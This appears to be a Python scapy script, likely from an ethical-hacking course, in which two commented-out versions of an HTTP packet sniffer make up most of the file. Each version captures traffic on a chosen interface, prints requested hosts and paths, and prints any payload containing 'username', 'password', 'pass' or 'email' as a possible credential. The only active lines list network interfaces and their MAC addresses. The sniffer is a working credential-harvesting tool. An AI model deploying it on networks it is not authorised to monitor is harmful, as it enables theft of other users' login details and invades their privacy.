# import scapy.all as scapy
# import argparse
# from scapy.layers import http


# def get_interface():
#     parser= argparse.ArgumentParser()
#     parser.add_argument("-i", "--interface", dest= "interface", help="Specify interface on which sniff packets")
#     arguments= parser.parse_args()
#     return arguments.interface
# def sniff(iface):
#     scapy.sniff(iface=iface, store= False, prn= process_packet)



# def process_packet(packet):
#     if packet.haslayer(http.HTTPRequest):
#         print("[+] Http Request>>" + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path)
#         if packet.haslayer(scapy.Raw):
#             load = packet[scapy.Raw].load
#             keys= ["username", "password", "pass", "email"]
#             for key in keys:
#                 if key in load:
#                     print("[+] Possible password/username>>> " + load)
#                     break

#         print(packet[http.HTTPRequest].Host)


# iface= get_interface()
# sniff(iface)        
     

# import scapy.all as scapy
# import argparse
# from scapy.layers import http

# def get_interface():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
#     arguments = parser.parse_args()
#     if not arguments.interface:
#         print("❌ No interface specified. Use -i <interface>")
#         exit()
#     return arguments.interface

# def sniff(iface):
#     scapy.sniff(iface=iface, store=False, prn=process_packet)

# def process_packet(packet):
#     if packet.haslayer(http.HTTPRequest):
#         try:
#             host = packet[http.HTTPRequest].Host.decode()
#             path = packet[http.HTTPRequest].Path.decode()
#             print(f"[+] HTTP Request >> {host}{path}")
#         except:
#             print("[!] Could not decode host/path")

#         if packet.haslayer(scapy.Raw):
#             try:
#                 load = packet[scapy.Raw].load.decode(errors="ignore")
#                 keys = ["username", "password", "pass", "email"]
#                 for key in keys:
#                     if key in load:
#                         print(f"[+] Possible credential >> {load}")
#                         break
#             except:
#                 print("[!] Could not decode payload")

# iface = get_interface()
# sniff(iface)



import scapy.all as scapy

for iface in scapy.get_if_list():
    print(f"{iface} → {scapy.get_if_hwaddr(iface)}")